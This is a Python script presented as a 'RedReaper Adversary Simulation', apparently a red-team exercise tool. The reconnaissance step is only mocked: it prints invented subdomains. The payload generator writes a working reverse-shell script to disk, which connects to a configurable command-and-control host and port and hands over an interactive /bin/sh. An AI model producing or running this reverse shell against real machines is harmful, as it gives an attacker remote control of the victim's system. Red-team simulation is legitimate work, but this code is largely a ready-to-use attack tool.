import os
import json
import subprocess
from datetime import datetime

CONFIG_PATH = "settings.json"

# -------------------- Setup -------------------- #
def load_config():
    if not os.path.exists(CONFIG_PATH):
        os.makedirs("config", exist_ok=True)
        default_config = {
            "recon": {
                "target_domain": "example.com"
            },
            "c2": {
                "host": "127.0.0.1",
                "port": 4444
            }
        }
        with open(CONFIG_PATH, "w") as f:
            json.dump(default_config, f, indent=4)
    with open(CONFIG_PATH, "r") as f:
        return json.load(f)

# -------------------- Recon Module -------------------- #
def recon(domain):
    print(f"[+] Starting passive reconnaissance on domain: {domain}")
    print("[+] Performing subdomain enumeration (mocked)...")
    subdomains = ["mail." + domain, "vpn." + domain, "dev." + domain]
    for sub in subdomains:
        print(f" - Found subdomain: {sub}")
    return subdomains

# -------------------- Payload Generator -------------------- #
def generate_payload(ip, port, output="payloads/reverse_shell.py"):
    os.makedirs("payloads", exist_ok=True)
    code = f"""
import socket, subprocess, os
s = socket.socket()
s.connect(('{ip}', {port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""
    with open(output, "w") as f:
        f.write(code)
    print(f"[+] Payload written to {output}")

# -------------------- Scenario Engine -------------------- #
def run_scenario(config):
    print("\n=== RedReaper Adversary Simulation ===")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[+] Started at {timestamp}")

    # 1. Reconnaissance
    domain = config["recon"]["target_domain"]
    subdomains = recon(domain)

    # 2. Generate Payload
    c2_host = config["c2"]["host"]
    c2_port = config["c2"]["port"]
    generate_payload(c2_host, c2_port)

    print("\n[+] Simulation complete.")

# -------------------- Entry Point -------------------- #
def main():
    config = load_config()
    run_scenario(config)

if __name__ == "__main__":
    main()
